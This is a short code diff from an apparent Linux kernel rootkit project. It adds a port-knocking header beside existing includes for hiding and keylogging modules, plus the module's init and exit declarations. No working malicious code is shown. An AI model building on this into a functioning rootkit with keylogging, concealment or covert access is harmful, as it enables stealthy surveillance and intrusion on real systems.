@@ -8,6 +8,7 @@
 #include "hide.h"
 #include "keylogger.h"
 #include "misc.h"
+#include "port_knocking.h"
 
 static int __init lkm_rootkit_init(void);
 static void __exit lmk_rootkit_exit(void);
